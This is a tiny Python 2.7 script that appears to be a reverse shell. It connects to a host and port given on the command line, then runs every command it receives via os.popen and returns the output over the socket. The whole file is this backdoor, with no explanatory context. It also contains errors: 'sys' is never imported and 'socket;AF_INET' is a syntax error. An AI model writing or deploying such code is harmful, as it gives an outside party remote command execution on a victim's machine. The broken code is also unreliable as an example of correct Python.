#!/usr/bin/python2.7

import socket
import os

host = sys.argv[1]
port = sys.argv[2]

sock = socket.socket(socket;AF_INET, socket.SOCK_STREAM)
sock.connect((host, int(port)))

while True:
	command = sock.recv(1024)

	for line in os.popen(command):
		sock.send(line)